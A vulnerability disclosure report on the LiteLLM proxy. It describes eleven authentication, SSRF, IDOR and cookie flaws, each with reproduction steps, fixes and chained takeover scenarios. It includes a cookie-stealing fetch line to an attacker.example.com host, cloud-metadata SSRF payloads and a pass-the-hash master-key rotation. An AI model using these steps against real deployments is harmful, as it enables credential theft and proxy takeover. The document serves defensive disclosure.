# LiteLLM Proxy Security Vulnerability Report

**Date:** 2026-04-21
**Scope:** LiteLLM proxy server (self-hosted and cloud)
**Method:** Source code audit + automated PoC tests
**PoC test file:** `tests/test_litellm/proxy/security_poc/test_auth_bypass_poc.py`
**Total PoC tests:** 32 (all passing)

---

## Executive Summary

We identified **11 confirmed, exploitable security vulnerabilities** in the LiteLLM proxy server. Seven are P1 (unauthenticated access, bounty-eligible per `security.md`) and four are P2 (authenticated privilege escalation). Multiple vulnerabilities can be chained for full proxy takeover from zero credentials.

| # | Vulnerability | Severity | Category | Tests |
|---|---|---|---|---|
| 1 | MCP `.well-known` query-string auth bypass | **P1 Critical** | Auth Bypass | 4 |
| 2 | Unauthenticated `/debug/asyncio-tasks` | **P1 Medium** | Info Disclosure | 3 |
| 3 | MCP OAuth2 fallback silent anonymous access | **P1 Critical** | Auth Bypass | 4 |
| 4 | Pass-the-hash on master key | **P2 Critical** | Privilege Escalation | 3 |
| 5 | IDOR on `/user/info` v1 endpoint | **P2 High** | Data Leak / IDOR | 3 |
| 6 | `/spend/keys` leaks all API keys | **P2 High** | Credential Disclosure | 2 |
| 7 | MCP OAuth metadata SSRF | **P1 High** | SSRF | 4 |
| 8 | Unauthenticated `/token` endpoint + SSRF | **P1 High** | Unauth + SSRF | 3 |
| 9 | Unauthenticated `/metrics` exposes PII | **P1 High** | PII Disclosure | 2 |
| 10 | `/global/spend/reset` missing admin gate | **P2 Critical** | Missing AuthZ | 2 |
| 11 | Login cookies missing security flags | **P1 High** | Session Hijacking | 2 |

---

## Attack Chains

These vulnerabilities can be combined for devastating multi-step attacks:

**Chain 1: Full proxy takeover from any authenticated user**
`/spend/keys` (get all key hashes) -> pass-the-hash -> master key rotation = admin takeover

**Chain 2: Cloud infrastructure compromise (unauthenticated)**
MCP OAuth SSRF (redirect to 169.254.169.254) -> unauthenticated `/token` (exfiltrate cloud creds)

**Chain 3: Unrestricted MCP access (unauthenticated)**
MCP OAuth2 fallback (send garbage Bearer token) -> `route_checks.py` skips all authZ for `/v1/mcp/*`

**Chain 4: Full proxy takeover from network access alone (unauthenticated)**
`/metrics` (scrape API key hashes + emails) -> pass-the-hash = admin takeover without any credentials

**Chain 5: Budget enforcement destruction**
XSS + insecure cookies (steal JWT) -> `/global/spend/reset` = zero all spend counters

---

## Detailed Vulnerability Descriptions

### Vulnerability 1: MCP `.well-known` Query-String Auth Bypass

**Severity:** P1 Critical - Authentication Bypass
**Location:** `litellm/proxy/_experimental/mcp_server/auth/user_api_key_auth_mcp.py`
**Bounty eligible:** Yes ($500-$1,500)

**Description:**
The MCP auth handler checks `'.well-known' in str(request.url)` to skip authentication for OAuth discovery endpoints. Because `str(request.url)` includes the query string, an attacker can append `?x=.well-known` to any MCP endpoint URL and bypass authentication entirely.

**Steps to reproduce:**
1. Send `GET /v1/mcp/tools?x=.well-known` with no authentication headers
2. The proxy skips `user_api_key_auth` entirely
3. Returns anonymous `UserAPIKeyAuth()` with no api_key, user_id, or team_id
4. Attacker has full unauthenticated access to all MCP tools and resources

**Fix:** Replace `'.well-known' in str(request.url)` with `'/.well-known' in request.url.path`

---

### Vulnerability 2: Unauthenticated `/debug/asyncio-tasks`

**Severity:** P1 Medium - Information Disclosure
**Location:** `litellm/proxy/common_utils/debug_utils.py`
**Bounty eligible:** Yes ($500-$1,500)

**Description:**
The `GET /debug/asyncio-tasks` endpoint is registered with no `Depends(user_api_key_auth)` dependency. Any unauthenticated client can call it and receive the full list of active asyncio task coroutine names.

**Steps to reproduce:**
1. Send `GET /debug/asyncio-tasks` with no headers
2. Receive 200 OK with JSON listing all active coroutine names
3. Information disclosed: proxy internals (Redis usage, provider names, logging pipeline, spend tracking)

**Fix:** Add `dependencies=[Depends(user_api_key_auth)]` to the route decorator.

---

### Vulnerability 3: MCP OAuth2 Fallback Silent Anonymous Access

**Severity:** P1 Critical - Authentication Bypass
**Location:** `litellm/proxy/_experimental/mcp_server/auth/user_api_key_auth_mcp.py`, lines 127-153
**Bounty eligible:** Yes ($500-$1,500)

**Description:**
When a client sends any value in the `Authorization` header (without `x-litellm-api-key`), the handler tries to validate it as a LiteLLM key. If validation raises HTTPException(401/403) or ProxyException(401/403), the handler silently catches the error and returns `UserAPIKeyAuth()` -- granting anonymous access. Combined with `route_checks.py` lines 231-232 which contain a blanket `pass` for `/v1/mcp/*` routes, this anonymous identity is never checked.

**Steps to reproduce:**
1. Send `GET /v1/mcp/tools` with header `Authorization: Bearer totally-invalid-key`
2. `user_api_key_auth` raises 401
3. Exception is caught, anonymous `UserAPIKeyAuth()` returned
4. `route_checks.py` skips all authorization for MCP routes
5. Attacker has full anonymous MCP access with no accountability or spend tracking

**Fix:** Remove the `except HTTPException` and `except ProxyException` blocks that return `UserAPIKeyAuth()`. Always propagate auth failures.

---

### Vulnerability 4: Pass-the-Hash on Master Key

**Severity:** P2 Critical - Privilege Escalation
**Location:** `litellm/proxy/spend_tracking/spend_tracking_utils.py`, `_is_master_key()` lines 55-69
**Bounty eligible:** No (P2)

**Description:**
`_is_master_key()` accepts both the plaintext master key AND its SHA-256 hash as valid credentials. The hash is stored in the `LiteLLM_VerificationToken` table and appears in spend logs. Any user who can read the hash (e.g., via `/spend/keys`) can use it to pass the master-key gate in the key regeneration endpoint, rotating the master key to one they control.

**Steps to reproduce:**
1. Obtain master key hash from `/spend/keys` response (Vulnerability 6) or `/metrics` (Vulnerability 9)
2. Call `POST /key/regenerate` with `key=<sha256-hash-of-master-key>`
3. `_is_master_key()` returns True for the hash
4. Master key is rotated to attacker's value -- full proxy takeover

**Fix:** Remove the hash comparison branch from `_is_master_key()`. Only accept `secrets.compare_digest(api_key, _master_key)`.

---

### Vulnerability 5: IDOR on `/user/info` v1 Endpoint

**Severity:** P2 High - Insecure Direct Object Reference
**Location:** `litellm/proxy/management_endpoints/internal_user_endpoints.py`, `user_info()` lines 704-790
**Bounty eligible:** No (P2)

**Description:**
The v1 `user_info()` endpoint does not check whether the authenticated caller's `user_id` matches the `user_id` query parameter. Any authenticated user (even `INTERNAL_USER` role) can supply any other user's ID and receive their full profile including all API keys. The v2 endpoint (`_check_user_info_v2_access`) correctly enforces access control.

**Steps to reproduce:**
1. Authenticate as any user with role `INTERNAL_USER`
2. Send `GET /user/info?user_id=<victim-user-id>`
3. Receive victim's full profile, including all their API keys in the `keys` field
4. Use stolen key hashes for pass-the-hash (Vulnerability 4)

**Fix:** Add the same access control check from v2 (`_check_user_info_v2_access`) to the v1 endpoint.

---

### Vulnerability 6: `/spend/keys` Leaks All API Keys

**Severity:** P2 High - Credential Disclosure
**Location:** `litellm/proxy/spend_tracking/spend_management_endpoints.py`, `spend_key_fn()` lines 34-66
**Bounty eligible:** No (P2)

**Description:**
`spend_key_fn()` fetches ALL keys from the database with `query_type="find_all"` and no filtering by caller identity. The function signature has no `user_api_key_dict` parameter, so it structurally cannot perform per-caller filtering. Any authenticated user receives every API key in the system.

**Steps to reproduce:**
1. Authenticate with any valid API key (even lowest-privilege `INTERNAL_USER`)
2. Send `GET /spend/keys`
3. Receive all API keys in the entire LiteLLM installation
4. Extract master key hash for pass-the-hash attack (Vulnerability 4)

**Fix:** Add `user_api_key_dict: UserAPIKeyAuth = Depends(user_api_key_auth)` to the function signature. Filter results by caller's role (admin sees all, others see only own keys).

---

### Vulnerability 7: MCP OAuth Metadata SSRF

**Severity:** P1 High - Server-Side Request Forgery
**Location:** `litellm/proxy/_experimental/mcp_server/mcp_server_manager.py`
**Bounty eligible:** Yes ($500-$1,500)

**Description:**
The MCP OAuth discovery chain follows RFC 9728 to fetch authorization server metadata. A malicious MCP server can return `WWW-Authenticate: Bearer resource_metadata="http://169.254.169.254/..."` and the proxy will fetch the cloud metadata endpoint with no SSRF validation. The attacker-controlled response is trusted as OAuth metadata, and an internal URL gets stored as `token_url`.

**Steps to reproduce:**
1. Register a malicious MCP server URL
2. Server responds 401 with `WWW-Authenticate: Bearer resource_metadata="http://169.254.169.254/latest/meta-data/iam/security-credentials/role"`
3. Proxy fetches cloud metadata (SSRF)
4. Metadata response returns `{"authorization_servers": ["http://169.254.169.254/auth"]}`
5. Auth server metadata returns `{"token_endpoint": "http://169.254.169.254/token"}`
6. Stored `token_url` now points to internal cloud metadata
7. Subsequent `/token` calls POST credentials to the internal endpoint

**Fix:** Add URL validation (private IP blocklist, scheme allowlist) to `_fetch_oauth_metadata_from_resource()` and `_fetch_single_authorization_server_metadata()`.

---

### Vulnerability 8: Unauthenticated `/token` Endpoint + SSRF

**Severity:** P1 High - Unauthenticated SSRF
**Location:** `litellm/proxy/_experimental/mcp_server/discoverable_endpoints.py`, lines 589-636
**Bounty eligible:** Yes ($500-$1,500)

**Description:**
The `POST /token` and `POST /{mcp_server_name}/token` endpoints have no authentication dependency. Any unauthenticated client can call them. The endpoint calls `exchange_token_with_server()` which POSTs supplied credentials to `mcp_server.token_url` with no SSRF validation.

**Steps to reproduce:**
1. (Pre-condition) Attacker has stored an internal URL as `token_url` via Vulnerability 7
2. Send `POST /token` with no auth header, body: `grant_type=authorization_code&code=anything&client_id=evil`
3. Proxy POSTs the credentials to the internal `token_url` (e.g., `http://169.254.169.254/latest/api/token`)
4. Attacker receives response from internal endpoint

**Fix:** Add `dependencies=[Depends(user_api_key_auth)]` to the `/token` routes. Add SSRF validation to `exchange_token_with_server()`.

---

### Vulnerability 9: Unauthenticated `/metrics` Exposes PII

**Severity:** P1 High - Unauthenticated PII Disclosure
**Location:** `litellm/integrations/prometheus.py`, `PrometheusLogger._mount_metrics_endpoint()`
**Bounty eligible:** Yes ($500-$1,500)

**Description:**
The Prometheus `/metrics` endpoint is mounted via `app.mount("/metrics", metrics_app)` with zero authentication. The source code debug log explicitly says "no authentication". Prometheus labels include: `hashed_api_key`, `user_email`, `team`, `api_base`, `end_user`, `api_key_alias` -- all PII exposed to any network-adjacent observer.

**Steps to reproduce:**
1. Send `GET /metrics` with no headers from any network location that can reach the proxy
2. Receive all Prometheus metrics with PII labels
3. Extract API key hashes and user emails
4. Use hashes for pass-the-hash attack (Vulnerability 4)

**Fix:** Add authentication middleware to the `/metrics` ASGI mount, or gate it behind `user_api_key_auth`.

---

### Vulnerability 10: `/global/spend/reset` Missing Admin Gate

**Severity:** P2 Critical - Missing Authorization
**Location:** `litellm/proxy/spend_tracking/spend_management_endpoints.py`, `global_spend_reset()`
**Bounty eligible:** No (P2)

**Description:**
The `POST /global/spend/reset` endpoint has `dependencies=[Depends(user_api_key_auth)]` (authentication), but the function has no `user_api_key_dict` parameter, so the caller's role is structurally unavailable. The docstring says "ADMIN ONLY / MASTER KEY Only Endpoint", but no admin check exists. Any authenticated user can zero ALL spend counters for ALL keys and ALL teams.

**Steps to reproduce:**
1. Authenticate with any valid API key (`INTERNAL_USER` role is sufficient)
2. Send `POST /global/spend/reset`
3. All spend counters for all API keys and all teams are set to 0.0
4. Budget enforcement is destroyed -- exhausted budgets become usable again

**Fix:** Add `user_api_key_dict: UserAPIKeyAuth = Depends(user_api_key_auth)` to the function signature. Check `user_api_key_dict.user_role == LitellmUserRoles.PROXY_ADMIN`.

---

### Vulnerability 11: Login Cookies Missing Security Flags

**Severity:** P1 High - Session Hijacking
**Location:** `litellm/proxy/proxy_server.py`, `/login`, `/v2/login`, `/v3/login/exchange` endpoints
**Bounty eligible:** Yes ($500-$1,500)

**Description:**
Three login endpoints call `response.set_cookie(key="token", value=jwt_token)` with no `httponly`, `secure`, or `samesite` flags. Without `httponly`, any XSS can steal the JWT via `document.cookie`. Without `secure`, the cookie is sent over plain HTTP. Without `samesite`, the cookie is vulnerable to CSRF.

**Steps to reproduce:**
1. Log in to the LiteLLM dashboard via any login endpoint
2. Open browser dev tools -> Application -> Cookies
3. Observe the `token` cookie has no `HttpOnly`, `Secure`, or `SameSite` flags
4. Any XSS vector can execute: `fetch('https://attacker.example.com/steal?t=' + document.cookie)`
5. Attacker replays the JWT to gain full access to the victim's session

**Fix:** Change all `set_cookie` calls to include `httponly=True, secure=True, samesite="lax"`.

---

## Running the PoC Tests

```bash
# Run all 32 PoC tests
python -m pytest tests/test_litellm/proxy/security_poc/test_auth_bypass_poc.py -v

# Run tests for a specific vulnerability
python -m pytest tests/test_litellm/proxy/security_poc/test_auth_bypass_poc.py -v -k "TestWellKnownQueryStringBypass"
python -m pytest tests/test_litellm/proxy/security_poc/test_auth_bypass_poc.py -v -k "TestMCPOAuth2FallbackBypass"
python -m pytest tests/test_litellm/proxy/security_poc/test_auth_bypass_poc.py -v -k "TestPassTheHashMasterKey"
# etc.
```

All tests are self-contained, require no external services, and run in ~1.5 seconds.

---

## Additional Findings (Not Yet PoC'd)

The following were identified during exploration but not yet proven with automated tests:

- `/get/config/callbacks` leaks SMTP passwords, Slack webhooks, API keys to any authenticated user
- `/spend/users` returns all users' PII with no role check
- `/spend/logs` exposes full spend logs to non-admin roles
- No rate limiting on `/login` -- unlimited brute-force on UI password
- Pass-through endpoint SSRF (admin registers arbitrary target URL)
- Vertex AI path injection (user-controlled location in URL path)
- JWT audience not validated when env var is unset
- OIDC userinfo bypass (opaque tokens bypass JWT signature verification)
- Multiple `/global/spend/*` endpoints with no admin check
